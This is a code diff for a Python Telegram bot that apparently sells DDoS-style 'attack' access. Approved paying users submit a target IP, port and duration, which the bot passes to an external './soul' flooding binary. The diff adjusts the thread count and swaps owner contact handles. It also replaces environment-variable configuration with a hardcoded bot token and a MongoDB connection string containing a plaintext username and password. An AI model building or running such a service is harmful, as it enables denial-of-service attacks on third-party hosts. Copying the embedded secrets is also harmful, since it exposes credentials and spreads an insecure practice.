@@ -1,11 +1,10 @@
 import os
 import telebot
 import json
-from pymongo import MongoClient
-
 import requests
 import logging
 import time
+from pymongo import MongoClient
 from datetime import datetime, timedelta
 import certifi
 import random
@@ -17,31 +16,17 @@ from telebot.types import ReplyKeyboardMarkup, KeyboardButton
 
 loop = asyncio.get_event_loop()
 
-
-
-# Configuration
-TOKEN = os.getenv("BOT_TOKEN")  # Fetch token from environment variable
-if not TOKEN:
-    raise ValueError("BOT_TOKEN environment variable not set!")
-    
-  # Configuration
-MONGO_DB_URL = os.getenv("MONGO_DB_URL")  # MongoDB URL environment variable se fetch karein
-
-if not MONGO_DB_URL:
-    raise ValueError("MONGO_DB_URL environment variable not set!")
-  
-    
-client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
-db = client['zoya']
-users_collection = db.users
-   
+TOKEN = '7776000937:AAGWS2CNiNV9hxRCr7WAANh0fzeovvKyLgA'
+MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
 FORWARD_CHANNEL_ID = -1002188746287
 CHANNEL_ID = -1002188746287
 error_channel_id = -1002188746287
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
-
+client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
+db = client['zoya']
+users_collection = db.users
 
 bot = telebot.TeleBot(TOKEN)
 REQUEST_INTERVAL = 1
@@ -99,7 +84,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 200")
     await process.communicate()
     bot.attack_in_progress = False
 
@@ -185,7 +170,7 @@ def handle_attack_command(message):
         if not user_data or user_data['plan'] == 0:
             bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                        "*You need to be approved to use this bot.*\n"  # Need approval message
-                                       "*Contact the owner for assistance: @SOULCRACKS.*", parse_mode='Markdown')  # Contact owner message
+                                       "*Contact the owner for assistance: @TANISHULTRA54.*", parse_mode='Markdown')  # Contact owner message
             return
 
         # Check plan limits
@@ -283,11 +268,11 @@ def myinfo_command(message):
     if not user_data:
         # User not found in the database
         response = "*❌ Oops! No account information found!* \n"  # Account not found message
-        response += "*For assistance, please contact the owner: @SOULCRACKS* "  # Contact owner message
+        response += "*For assistance, please contact the owner: @RAVENxKUNAL* "  # Contact owner message
     elif user_data.get('plan', 0) == 0:
         # User found but not approved
         response = "*🔒 Your account is still pending approval!* \n"  # Not approved message
-        response += "*Please reach out to the owner for assistance: @SOULCRACKS* 🙏"  # Contact owner message
+        response += "*Please reach out to the owner for assistance: @RAVENxKUNAL* 🙏"  # Contact owner message
     else:
         # User found and approved
         username = message.from_user.username or "Unknown User"  # Default username if none provided
@@ -348,7 +333,7 @@ def owner_command(message):
     response = (
         "*👤 **Owner Information:**\n\n"
         "For any inquiries, support, or collaboration opportunities, don't hesitate to reach out to the owner:\n\n"
-        "📩 **Telegram:** @SOULCRACKS\n\n"
+        "📩 **Telegram:** @TANISHULTRA54\n\n"
         "💬 **We value your feedback!** Your thoughts and suggestions are crucial for improving our service and enhancing your experience.\n\n"
         "🌟 **Thank you for being a part of our community!** Your support means the world to us, and we’re always here to help!*\n"
     )
